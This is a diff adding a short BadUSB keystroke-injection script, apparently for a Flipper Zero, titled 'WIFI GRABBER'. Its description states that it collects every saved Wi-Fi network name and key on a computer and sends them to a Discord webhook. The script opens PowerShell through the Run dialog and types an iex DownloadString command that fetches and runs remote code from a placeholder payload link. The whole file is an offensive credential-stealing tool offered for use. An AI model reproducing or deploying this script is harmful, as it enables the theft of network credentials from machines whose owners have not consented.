@@ -1,0 +1,11 @@
+REM Title : WIFI GRABBER
+REM Description : It grabs all wifi ssid and keys on a computer and send it on a discord webhook
+REM Author : ImSoToxicc ( https://github.com/ImSoToxicc/Flipper-zero )
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 500
+REM Upload the payload and copy his link below ( Tutorial in BadUSB/README )
+STRING iex ((New-Object System.Net.WebClient).DownloadString('payload link'))
+ENTER
